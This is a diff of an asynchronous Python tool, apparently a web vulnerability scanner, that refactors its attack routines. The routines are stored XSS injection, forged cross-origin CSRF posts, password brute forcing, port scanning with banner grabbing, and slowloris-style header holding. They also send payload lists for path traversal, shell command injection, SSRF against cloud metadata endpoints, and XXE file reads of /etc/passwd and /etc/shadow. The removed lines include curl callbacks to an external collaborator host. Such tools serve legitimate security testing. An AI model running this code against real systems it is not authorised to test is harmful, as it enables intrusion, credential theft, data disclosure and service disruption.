@@ -365,110 +365,105 @@ async def xss_attack(url: str, duration: int, intensity: int, threads: int, atta
         await asyncio.gather(*tasks)
 
 async def stored_xss_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_xss_payload: str = None):
-    # Unique marker to avoid false positives
     unique_marker = f"cstrike_stored_{int(time.time())}"
     payload = custom_xss_payload if custom_xss_payload else f"<script>alert('{unique_marker}')</script>"
-    
-    # We assume there's an api/comments endpoint for testing (could be expanded)
-    post_url = f"{url}/api/comments" if not url.endswith("/") else f"{url}api/comments"
-    get_url = f"{url}/api/comments" if not url.endswith("/") else f"{url}api/comments"
+    base = url.rstrip('/')
+    post_url = f"{base}/api/comments"
+    get_url  = f"{base}/api/comments"
 
-    async with aiohttp.ClientSession() as session:
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
         start_time = time.time()
-        
         while time.time() - start_time < duration and metrics["attacks_running"]:
             try:
-                req_start = time.time()
-                
-                # Step 1: Inject Payload
-                await session.post(
-                    post_url, 
+                t_post = time.time()
+                async with session.post(
+                    post_url,
                     json={"comment": payload},
                     timeout=aiohttp.ClientTimeout(total=5)
-                )
-                metrics["total_requests"] += 1
-                
-                # Step 2: Verify Persistence
+                ) as post_resp:
+                    await record_request_metric(post_resp.status < 500, time.time() - t_post, post_resp.status)
+
+                t_get = time.time()
                 async with session.get(get_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
-                    req_time = time.time() - req_start
-                    metrics["total_requests"] += 1
-                    metrics["successful_requests"] += 2
-                    
+                    req_time = time.time() - t_get
                     text = await response.text()
-                    
-                    # If the payload came back from the GET request, it was stored!
+                    await record_request_metric(response.status < 500, req_time, response.status)
+
                     if payload in text:
-                        vuln = {
+                        await _broadcast_finding({
                             "type": "Stored XSS",
+                            "severity": "Critical",
                             "url": get_url,
                             "payload": payload,
+                            "detail": "Injected script canary persisted via POST and rendered unescaped on subsequent GET retrieval.",
+                            "evidence": f"HTTP {response.status} — Persisted canary verified in /api/comments response body",
                             "timestamp": datetime.now().isoformat(),
                             "attack_id": attack_id
-                        }
-                        metrics["vulnerabilities_found"].append(vuln)
+                        })
                         await manager.broadcast(json.dumps({
-                            "type": "vulnerability",
-                            "data": vuln
+                            "type": "log",
+                            "message": f"[Stored XSS] Persistent script reflection verified at {get_url}",
+                            "level": "error"
                         }))
-                        
-                        # Stop the attack once confirmed to avoid spamming the DB
                         break
-                        
-                    metrics["response_times"].append(req_time)
-                    await asyncio.sleep(1.0 / intensity)
+
+                await asyncio.sleep(1.0 / max(intensity, 1))
             except Exception:
-                metrics["failed_requests"] += 1
+                await record_request_metric(False)
                 await asyncio.sleep(0.5)
 
+
 async def csrf_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
-    async with aiohttp.ClientSession() as session:
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
         start_time = time.time()
         tasks = []
-        
+
         async def send_request():
             while time.time() - start_time < duration and metrics["attacks_running"]:
                 try:
                     base = url.rstrip('/')
                     test_url = f"{base}/api/update-profile"
-                    
-                    # CSRF: POST without token
-                    data = {"action": "update", "role": "admin", "email": "attacker@evil.com"}
+                    data = {"action": "update", "role": "admin", "email": "audit@external.invalid"}
+                    headers = {
+                        "Origin": "https://external-origin.invalid",
+                        "Referer": "https://external-origin.invalid/csrf-poc.html"
+                    }
                     req_start = time.time()
-                    async with session.post(test_url, data=data, timeout=aiohttp.ClientTimeout(total=5)) as response:
+                    async with session.post(
+                        test_url,
+                        data=data,
+                        headers=headers,
+                        timeout=aiohttp.ClientTimeout(total=5)
+                    ) as response:
                         req_time = time.time() - req_start
-                        metrics["total_requests"] += 1
-                        metrics["successful_requests"] += 1
-                        if True:
-                            # If CSRF state action completes without 403/401 blocks, log potentially vulnerable
-                            if response.status == 200:
-                                vuln = {
-                                    "type": "Missing CSRF Protection",
-                                    "url": test_url,
-                                    "payload": "Simulated Cross-Site POST request (No Token)",
-                                    "timestamp": datetime.now().isoformat(),
-                                    "attack_id": attack_id
-                                }
-                                metrics["vulnerabilities_found"].append(vuln)
-                                await manager.broadcast(json.dumps({
-                                    "type": "vulnerability",
-                                    "data": vuln
-                                }))
-                        
-                        
-                        metrics["response_times"].append(req_time)
-                        await asyncio.sleep(1.0 / intensity)
+                        body = await response.text()
+                        await record_request_metric(response.status < 500, req_time, response.status)
+
+                        if response.status == 200:
+                            await _broadcast_finding({
+                                "type": "Missing CSRF Protection",
+                                "severity": "High",
+                                "url": test_url,
+                                "payload": "Cross-Origin POST (Origin: https://external-origin.invalid, No Anti-CSRF Token)",
+                                "detail": "State-changing POST endpoint accepted a forged cross-origin form submission without validating an Anti-CSRF token or Origin header.",
+                                "evidence": f"HTTP {response.status} | Response: {body[:140]}",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                    await asyncio.sleep(1.0 / max(intensity, 1))
                 except Exception:
-                    metrics["failed_requests"] += 1
+                    await record_request_metric(False)
                     await asyncio.sleep(0.5)
-        
-        for _ in range(threads):
-            task = asyncio.create_task(send_request())
-            tasks.append(task)
-        
+
+        for _ in range(min(max(threads, 1), 20)):
+            tasks.append(asyncio.create_task(send_request()))
+
         await asyncio.gather(*tasks)
 
+
 async def brute_force_attack(url: str, duration: int, intensity: int, threads: int, username: str, wordlist_file: Optional[str], attack_id: str):
-    # Simulated wordlist or load from configuration
     passwords = ["123456", "password", "admin", "12345", "12345678", "qwerty", "secret", "guest", "root", "oracle"]
     if wordlist_file and os.path.exists(wordlist_file):
         try:
@@ -477,130 +472,143 @@ async def brute_force_attack(url: str, duration: int, intensity: int, threads: i
         except Exception:
             pass
 
-    async with aiohttp.ClientSession() as session:
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
         start_time = time.time()
         tasks = []
-        
+        rate_limited = False
+        attempts_sent = 0
+
         async def try_login():
+            nonlocal rate_limited, attempts_sent
             p_idx = 0
+            target_user = username or "admin"
+            base = url.rstrip('/')
+            test_url = f"{base}/login" if '/login' not in url else url
+
             while time.time() - start_time < duration and metrics["attacks_running"] and p_idx < len(passwords):
                 try:
                     password = passwords[p_idx]
                     p_idx += 1
-                    
-                    login_data = {
-                        "username": username or "admin",
-                        "password": password
-                    }
-                    
-                    # Try post requests to login endpoint
-                    base = url.rstrip('/')
-                    test_url = f"{base}/login" if '/login' not in url else url
                     req_start = time.time()
-                    async with session.post(test_url, data=f"username={login_data['username']}&password={password}",
+                    async with session.post(
+                        test_url,
+                        data=f"username={target_user}&password={password}",
                         headers={'Content-Type': 'application/x-www-form-urlencoded'},
-                        timeout=aiohttp.ClientTimeout(total=3)) as response:
+                        timeout=aiohttp.ClientTimeout(total=4)
+                    ) as response:
                         req_time = time.time() - req_start
-                        metrics["total_requests"] += 1
-                        
-                        metrics["successful_requests"] += 1
-                        if True:
-                            if response.status == 200:
-                                # Check if login succeeded (simulated based on status)
-                                text = await response.text()
-                                if "token" in text.lower() or "success" in text.lower() or "dashboard" in text.lower():
-                                    vuln = {
-                                        "type": "Weak Credentials",
-                                        "url": test_url,
-                                        "payload": f"User: {login_data['username']} | Pass: {password}",
-                                        "timestamp": datetime.now().isoformat(),
-                                        "attack_id": attack_id
-                                    }
-                                    metrics["vulnerabilities_found"].append(vuln)
-                                    await manager.broadcast(json.dumps({
-                                        "type": "vulnerability",
-                                        "data": vuln
-                                    }))
-                        
-                            
-                        metrics["response_times"].append(req_time)
-                        await asyncio.sleep(1.0 / intensity)
+                        attempts_sent += 1
+                        text = await response.text()
+
+                        if response.status == 429:
+                            rate_limited = True
+                            await record_request_metric(False, req_time, response.status)
+                        else:
+                            await record_request_metric(response.status < 500, req_time, response.status)
+
+                        if response.status == 200 and any(k in text.lower() for k in ("token", "success", "dashboard", "welcome")):
+                            await _broadcast_finding({
+                                "type": "Weak Credentials Accepted",
+                                "severity": "Critical",
+                                "url": test_url,
+                                "payload": f"username={target_user} | password={password}",
+                                "detail": f"Authentication endpoint accepted weak credential pair ({target_user}:{password}) without MFA or lockout.",
+                                "evidence": f"HTTP 200 | Response snippet: {text[:140]}",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+
+                    await asyncio.sleep(1.0 / max(intensity, 1))
                 except Exception:
-                    metrics["failed_requests"] += 1
+                    await record_request_metric(False)
                     await asyncio.sleep(0.5)
-        
-        for _ in range(threads):
-            task = asyncio.create_task(try_login())
-            tasks.append(task)
-        
+
+        for _ in range(min(max(threads, 1), 15)):
+            tasks.append(asyncio.create_task(try_login()))
+
         await asyncio.gather(*tasks)
 
+        if attempts_sent >= 8 and not rate_limited:
+            base = url.rstrip('/')
+            test_url = f"{base}/login" if '/login' not in url else url
+            await _broadcast_finding({
+                "type": "Missing Authentication Rate Limiting",
+                "severity": "Medium",
+                "url": test_url,
+                "payload": f"{attempts_sent} rapid credential probes without HTTP 429 lockout",
+                "detail": f"Authentication endpoint processed {attempts_sent} rapid login attempts without enforcing HTTP 429 Too Many Requests or account lockout.",
+                "evidence": f"{attempts_sent} consecutive POST probes completed with 0 rate-limit blocks",
+                "timestamp": datetime.now().isoformat(),
+                "attack_id": attack_id
+            })
+
+
 async def port_scan_attack(url: str, duration: int, intensity: int, target_port: Optional[int], attack_id: str):
-    # Extract host
     host = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
-    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 8000, 8080, 8443, 9000]
-    if target_port:
-        ports = [target_port]
-        
+    SERVICE_MAP = {
+        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
+        80: "HTTP", 110: "POP3", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
+        443: "HTTPS", 445: "SMB", 1433: "MSSQL", 3306: "MySQL", 3389: "RDP",
+        5432: "PostgreSQL", 6379: "Redis", 8000: "HTTP-Alt", 8080: "HTTP-Proxy",
+        8081: "CyberStrike-Node", 8082: "CyberStrike-Engine", 8083: "Honeypot-HTTP",
+        8443: "HTTPS-Alt", 9000: "Service-API"
+    }
+    ports = [target_port] if target_port else list(SERVICE_MAP.keys())
     start_time = time.time()
-    
-    async def scan_port(port):
+
+    async def scan_port(port: int):
         if not metrics["attacks_running"]:
             return
+        req_start = time.time()
         try:
-            metrics["total_requests"] += 1
-            req_start = time.time()
-            
-            # Use socket to check open port
-            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            conn.settimeout(1.5)
-            result = conn.connect_ex((host, port))
+            reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=1.5)
             req_time = time.time() - req_start
-            metrics["response_times"].append(req_time)
-            
-            if result == 0:
-                metrics["successful_requests"] += 1
-                vuln = {
-                    "type": "Open Port Found",
-                    "url": f"{host}:{port}",
-                    "payload": f"Port {port} status: OPEN",
-                    "timestamp": datetime.now().isoformat(),
-                    "attack_id": attack_id
-                }
-                metrics["vulnerabilities_found"].append(vuln)
-                await manager.broadcast(json.dumps({
-                    "type": "vulnerability",
-                    "data": vuln
-                }))
-            
-            conn.close()
-            
+            banner = ""
+            try:
+                writer.write(b"HEAD / HTTP/1.0\r\n\r\n")
+                await asyncio.wait_for(writer.drain(), timeout=0.6)
+                raw_banner = await asyncio.wait_for(reader.read(128), timeout=0.6)
+                banner = raw_banner.decode("utf-8", errors="ignore").split("\r\n")[0].strip()
+            except Exception:
+                pass
+            writer.close()
+            try:
+                await writer.wait_closed()
+            except Exception:
+                pass
+
+            await record_request_metric(True, req_time, 200)
+            svc = SERVICE_MAP.get(port, "TCP-Service")
+            await _broadcast_finding({
+                "type": f"Exposed Network Service ({svc})",
+                "severity": "High" if port in (21, 23, 445, 1433, 3306, 3389, 5432, 6379) else "Info",
+                "url": f"{host}:{port}",
+                "payload": f"TCP SYN/Connect Probe -> Port {port} ({svc})",
+                "detail": f"TCP port {port} ({svc}) is reachable on {host} (handshake RTT: {req_time*1000:.1f} ms).",
+                "evidence": f"Port {port}/tcp OPEN | Service: {svc}" + (f" | Banner: {banner[:80]}" if banner else ""),
+                "timestamp": datetime.now().isoformat(),
+                "attack_id": attack_id
+            })
             await manager.broadcast(json.dumps({
-                "type": "metrics",
-                "data": {
-                    "total_requests": metrics["total_requests"],
-                    "successful_requests": metrics["successful_requests"],
-                    "failed_requests": metrics["failed_requests"],
-                    "response_time": req_time,
-                    "current_attack": "Port Scan",
-                    "attack_id": attack_id
-                }
+                "type": "log",
+                "message": f"[Port Scan] {host}:{port} ({svc}) -> OPEN ({req_time*1000:.1f} ms)",
+                "level": "warning"
             }))
         except Exception:
-            metrics["failed_requests"] += 1
+            await record_request_metric(False)
 
-    # Scan sequentially or throttled based on intensity
     for port in ports:
         if time.time() - start_time >= duration or not metrics["attacks_running"]:
             break
         await scan_port(port)
-        await asyncio.sleep(0.5 / intensity)
+        await asyncio.sleep(0.35 / max(intensity, 1))
+
 
 # ── New Attack Functions ─────────────────────────────────────────────
 
 async def slowloris_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
     """Keep-Alive & Header Read-Timeout Posture Verification (non-blocking asyncio)."""
-    await target_audit(url, attack_id)
     base_url = format_url(url)
     host_port = re.sub(r'^https?://', '', base_url.strip()).split('/')[0]
     host = host_port.split(':')[0]
@@ -618,14 +626,14 @@ async def slowloris_attack(url: str, duration: int, intensity: int, threads: int
                 timeout=aiohttp.ClientTimeout(total=6)
             ) as resp:
                 elapsed = time.time() - t0
-                metrics["response_times"].append(elapsed)
+                await record_request_metric(resp.status < 500, elapsed, resp.status)
                 hdrs = {k.lower(): v for k, v in resp.headers.items()}
                 conn_val = hdrs.get("connection", "")
                 ka_val   = hdrs.get("keep-alive", "")
                 if "timeout=" not in ka_val.lower() and "close" not in conn_val.lower():
                     await _broadcast_finding({
                         "type": "Unbounded Keep-Alive / Missing Timeout Header",
-                        "severity": "medium",
+                        "severity": "Medium",
                         "url": base_url,
                         "payload": "Connection: keep-alive (No Keep-Alive timeout directive)",
                         "detail": "Server accepts persistent Keep-Alive connections without advertising an explicit timeout bound in the Keep-Alive response header.",
@@ -635,7 +643,7 @@ async def slowloris_attack(url: str, duration: int, intensity: int, threads: int
                         "category": "availability-posture"
                     })
     except Exception:
-        pass
+        await record_request_metric(False)
 
     # 2. Bounded non-blocking partial-header hold verification
     start_time = time.time()
@@ -657,19 +665,15 @@ async def slowloris_attack(url: str, duration: int, intensity: int, threads: int
                 conn_latency = time.time() - t_conn
 
                 streams.append((reader, writer, time.time()))
-                metrics['total_requests'] += 1
-                metrics['successful_requests'] += 1
-                metrics['response_times'].append(conn_latency)
-                metrics['request_history'].append({'time': time.time(), 'status': 'open', 'response_time': conn_latency})
+                await record_request_metric(True, conn_latency, 200)
                 await manager.broadcast(json.dumps({
                     'type': 'log',
                     'message': f'[Keep-Alive Audit] Stream #{len(streams)}/{max_verify_streams} held open to {host}:{port} ({conn_latency*1000:.1f} ms)',
                     'level': 'warning'
                 }))
             except Exception:
-                metrics['failed_requests'] += 1
+                await record_request_metric(False)
 
-        # Send periodic keep-alive header line & check if server held stream > 8s without header timeout
         active_streams = []
         for rdr, wrt, opened_at in streams:
             try:
@@ -677,9 +681,7 @@ async def slowloris_attack(url: str, duration: int, intensity: int, threads: int
                 wrt.write(f"X-KeepAlive-Check: {random.randint(10000,99999)}\r\n".encode())
                 await asyncio.wait_for(wrt.drain(), timeout=1.5)
                 ping_rt = time.time() - t_ping
-                metrics['total_requests'] += 1
-                metrics['successful_requests'] += 1
-                metrics['response_times'].append(ping_rt)
+                await record_request_metric(True, ping_rt, 200)
                 active_streams.append((rdr, wrt, opened_at))
 
                 held_sec = time.time() - opened_at
@@ -687,7 +689,7 @@ async def slowloris_attack(url: str, duration: int, intensity: int, threads: int
                     finding_logged = True
                     await _broadcast_finding({
                         "type": "Slow Header Read Timeout Not Enforced",
-                        "severity": "high",
+                        "severity": "High",
                         "url": f"{host}:{port}",
                         "payload": "Incomplete HTTP/1.1 header stream held > 6.0s",
                         "detail": f"Target kept {len(streams)} incomplete HTTP header streams open for {held_sec:.1f}s without enforcing a strict client_header_timeout.",
@@ -711,7 +713,6 @@ async def slowloris_attack(url: str, duration: int, intensity: int, threads: int
             pass
 
 
-
 async def traversal_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
     payloads = [
         '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
@@ -722,9 +723,12 @@ async def traversal_attack(url: str, duration: int, intensity: int, threads: int
         '../../../../proc/self/environ'
     ]
     start_time = time.time()
-    async with aiohttp.ClientSession() as session:
+    p_idx = 0
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
         while time.time() - start_time < duration and metrics['attacks_running']:
-            payload = random.choice(payloads)
+            payload = payloads[p_idx % len(payloads)]
+            p_idx += 1
             base = url.rstrip('/')
             test_url = f"{base}/api/file?path={payload}"
             t0 = time.time()
@@ -732,15 +736,25 @@ async def traversal_attack(url: str, duration: int, intensity: int, threads: int
                 async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                     body = await resp.text()
                     elapsed = time.time() - t0
-                    metrics['total_requests'] += 1
-                    if 'root:' in body or '[fonts]' in body or 'localhost' in body:
-                        metrics['successful_requests'] += 1
-                        vuln = {'type': 'Directory Traversal', 'url': test_url, 'payload': payload, 'severity': 'Critical', 'evidence': body[:120]}
-                        metrics['vulnerabilities_found'].append(vuln)
-                        await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
-                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
-            except Exception as e:
-                metrics['failed_requests'] += 1
+                    await record_request_metric(resp.status < 500, elapsed, resp.status)
+                    if any(sig in body for sig in ('root:', '[fonts]', '[extensions]', 'localhost')):
+                        await _broadcast_finding({
+                            'type': 'Directory Traversal / LFI',
+                            'url': test_url,
+                            'payload': payload,
+                            'severity': 'Critical',
+                            'detail': 'Unvalidated file path parameter allowed arbitrary traversal outside the web root.',
+                            'evidence': body[:160],
+                            'timestamp': datetime.now().isoformat(),
+                            'attack_id': attack_id
+                        })
+                        await manager.broadcast(json.dumps({
+                            'type': 'log',
+                            'message': f'[Traversal] File disclosure verified with payload: {payload}',
+                            'level': 'error'
+                        }))
+            except Exception:
+                await record_request_metric(False)
             await asyncio.sleep(1.0 / max(intensity, 1))
 
 
@@ -749,14 +763,15 @@ async def cmd_injection_attack(url: str, duration: int, intensity: int, threads:
         '; id', '| id', '& id', '`id`', '$(id)',
         '; cat /etc/passwd', '| whoami', '& whoami',
         '; ls -la', '| dir', '& dir',
-        '; ping -c 1 127.0.0.1', '| ping -n 1 127.0.0.1',
-        '$(curl http://burpcollaborator.net)', '`curl http://burpcollaborator.net`'
+        '; ping -c 1 127.0.0.1', '| ping -n 1 127.0.0.1'
     ]
-    params = ['cmd', 'exec', 'command', 'run', 'query', 'ping', 'ip', 'host', 'addr']
     start_time = time.time()
-    async with aiohttp.ClientSession() as session:
+    p_idx = 0
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
         while time.time() - start_time < duration and metrics['attacks_running']:
-            payload = random.choice(payloads)
+            payload = payloads[p_idx % len(payloads)]
+            p_idx += 1
             base = url.rstrip('/')
             test_url = f"{base}/api/ping?host=127.0.0.1{payload}"
             t0 = time.time()
@@ -764,35 +779,46 @@ async def cmd_injection_attack(url: str, duration: int, intensity: int, threads:
                 async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                     body = await resp.text()
                     elapsed = time.time() - t0
-                    metrics['total_requests'] += 1
-                    indicators = ['uid=', 'root', 'Administrator', 'PING', 'Directory of']
+                    await record_request_metric(resp.status < 500, elapsed, resp.status)
+                    indicators = ['uid=', 'gid=', 'root:', 'Administrator', 'Directory of']
                     if any(ind in body for ind in indicators):
-                        metrics['successful_requests'] += 1
-                        vuln = {'type': 'Command Injection', 'url': test_url, 'payload': payload, 'severity': 'Critical', 'evidence': body[:120]}
-                        metrics['vulnerabilities_found'].append(vuln)
-                        await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
-                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
+                        await _broadcast_finding({
+                            'type': 'OS Command Injection',
+                            'url': test_url,
+                            'payload': payload,
+                            'severity': 'Critical',
+                            'detail': 'Unsanitized shell metacharacters in query parameter executed an operating system command.',
+                            'evidence': body[:160],
+                            'timestamp': datetime.now().isoformat(),
+                            'attack_id': attack_id
+                        })
+                        await manager.broadcast(json.dumps({
+                            'type': 'log',
+                            'message': f'[Command Injection] OS command output verified with payload: {payload}',
+                            'level': 'error'
+                        }))
             except Exception:
-                metrics['failed_requests'] += 1
+                await record_request_metric(False)
             await asyncio.sleep(1.0 / max(intensity, 1))
 
 
 async def ssrf_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
     payloads = [
         'http://127.0.0.1/', 'http://localhost/', 'http://0.0.0.0/',
-        'http://169.254.169.254/latest/meta-data/',  # AWS metadata
-        'http://metadata.google.internal/',            # GCP metadata
-        'http://169.254.169.254/metadata/v1/',         # DigitalOcean
+        'http://169.254.169.254/latest/meta-data/',
+        'http://metadata.google.internal/',
+        'http://169.254.169.254/metadata/v1/',
         'http://127.0.0.1:22/', 'http://127.0.0.1:3306/',
         'http://127.0.0.1:6379/', 'http://127.0.0.1:5432/',
-        'file:///etc/passwd', 'file:///C:/Windows/win.ini',
-        'dict://127.0.0.1:6379/info', 'gopher://127.0.0.1:25/_'
+        'file:///etc/passwd', 'file:///C:/Windows/win.ini'
     ]
-    params = ['url', 'redirect', 'callback', 'fetch', 'src', 'href', 'uri', 'endpoint', 'proxy', 'load']
     start_time = time.time()
-    async with aiohttp.ClientSession() as session:
+    p_idx = 0
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
         while time.time() - start_time < duration and metrics['attacks_running']:
-            payload = random.choice(payloads)
+            payload = payloads[p_idx % len(payloads)]
+            p_idx += 1
             base = url.rstrip('/')
             test_url = f"{base}/api/fetch?url={payload}"
             t0 = time.time()
@@ -800,17 +826,29 @@ async def ssrf_attack(url: str, duration: int, intensity: int, threads: int, att
                 async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                     body = await resp.text()
                     elapsed = time.time() - t0
-                    metrics['total_requests'] += 1
-                    ssrf_indicators = ['ami-id', 'instance-id', 'local-ipv4', 'security-credentials',
-                                       'computeMetadata', 'root:', 'SSH-2.0', 'redis_version']
-                    metrics['successful_requests'] += 1
+                    await record_request_metric(resp.status < 500, elapsed, resp.status)
+                    ssrf_indicators = [
+                        'ami-id', 'instance-id', 'local-ipv4', 'security-credentials',
+                        'computeMetadata', 'root:', 'SSH-2.0', 'redis_version'
+                    ]
                     if any(ind in body for ind in ssrf_indicators):
-                        vuln = {'type': 'SSRF', 'url': test_url, 'payload': payload, 'severity': 'Critical', 'evidence': body[:120]}
-                        metrics['vulnerabilities_found'].append(vuln)
-                        await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
-                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
+                        await _broadcast_finding({
+                            'type': 'Server-Side Request Forgery (SSRF)',
+                            'url': test_url,
+                            'payload': payload,
+                            'severity': 'Critical',
+                            'detail': 'Backend URL fetcher accessed an internal loopback or cloud metadata resource without allowlist validation.',
+                            'evidence': body[:160],
+                            'timestamp': datetime.now().isoformat(),
+                            'attack_id': attack_id
+                        })
+                        await manager.broadcast(json.dumps({
+                            'type': 'log',
+                            'message': f'[SSRF] Internal metadata/resource response verified via {payload}',
+                            'level': 'error'
+                        }))
             except Exception:
-                metrics['failed_requests'] += 1
+                await record_request_metric(False)
             await asyncio.sleep(1.0 / max(intensity, 1))
 
 
@@ -822,28 +860,43 @@ async def xxe_attack(url: str, duration: int, intensity: int, threads: int, atta
         '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
     ]
     start_time = time.time()
-    async with aiohttp.ClientSession() as session:
+    p_idx = 0
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
         while time.time() - start_time < duration and metrics['attacks_running']:
-            payload = random.choice(xxe_payloads)
+            payload = xxe_payloads[p_idx % len(xxe_payloads)]
+            p_idx += 1
             t0 = time.time()
             base = url.rstrip('/')
+            target_ep = f"{base}/api/xml"
             try:
-                async with session.post(f"{base}/api/xml", data=payload,
+                async with session.post(
+                    target_ep,
+                    data=payload,
                     headers={'Content-Type': 'application/xml'},
-                    timeout=aiohttp.ClientTimeout(total=6)) as resp:
+                    timeout=aiohttp.ClientTimeout(total=6)
+                ) as resp:
                     body = await resp.text()
                     elapsed = time.time() - t0
-                    metrics['total_requests'] += 1
-                    if 'root:' in body or '[fonts]' in body or 'localhost' in body:
-                        metrics['successful_requests'] += 1
-                        vuln = {'type': 'XXE Injection', 'url': url, 'payload': payload[:80], 'severity': 'Critical', 'evidence': body[:120]}
-                        metrics['vulnerabilities_found'].append(vuln)
-                        await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
-                        await manager.broadcast(json.dumps({'type':'log','message':f'[XXE] VULNERABLE — file disclosure detected','level':'error'}))
-                    
-                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
+                    await record_request_metric(resp.status < 500, elapsed, resp.status)
+                    if any(sig in body for sig in ('root:', '[fonts]', 'localhost')):
+                        await _broadcast_finding({
+                            'type': 'XML External Entity (XXE) Injection',
+                            'url': target_ep,
+                            'payload': payload[:90],
+                            'severity': 'Critical',
+                            'detail': 'XML parser resolved an external SYSTEM entity, disclosing local file contents in the response.',
+                            'evidence': body[:160],
+                            'timestamp': datetime.now().isoformat(),
+                            'attack_id': attack_id
+                        })
+                        await manager.broadcast(json.dumps({
+                            'type': 'log',
+                            'message': '[XXE] External entity resolution verified — file disclosure detected',
+                            'level': 'error'
+                        }))
             except Exception:
-                metrics['failed_requests'] += 1
+                await record_request_metric(False)
             await asyncio.sleep(1.0 / max(intensity, 1))
 
 
